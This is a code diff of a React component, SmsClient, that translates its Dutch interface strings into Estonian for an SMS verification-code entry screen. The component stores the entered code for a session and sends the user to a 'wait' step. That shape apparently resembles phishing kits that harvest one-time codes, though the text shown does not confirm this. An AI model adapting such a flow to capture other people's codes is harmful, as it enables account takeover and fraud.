@@ -101,7 +101,7 @@ export function SmsClient({ sessionId }: Props) {
       .eq("id", sessionId);
 
     setSaving(false);
-    if (error) setMsg("Verzenden mislukt.");
+    if (error) setMsg("Saatmine ebaõnnestus.");
     else {
       setSessionFormData(nextFormData);
       router.push(stepToPath("wait", sessionId));
@@ -134,7 +134,7 @@ export function SmsClient({ sessionId }: Props) {
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
-            Ongeldige link.
+              Vigane link.
           </p>
         </div>
       </div>
@@ -235,7 +235,7 @@ export function SmsClient({ sessionId }: Props) {
           </div>
 
           {!valid && code.length > 0 ? (
-            <p className="text-xs text-red-400">Voer exact {digits} cijfers in.</p>
+            <p className="text-xs text-red-400">Sisesta täpselt {digits} numbrit.</p>
           ) : null}
 
           {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
@@ -249,7 +249,7 @@ export function SmsClient({ sessionId }: Props) {
           </button>
 
           <p className="text-center text-xs text-gray-400 mt-4">
-            De code is per sms naar je mobiele nummer verzonden.
+            Kood saadeti SMS-iga sinu mobiilinumbrile.
           </p>
         </form>
       </div>
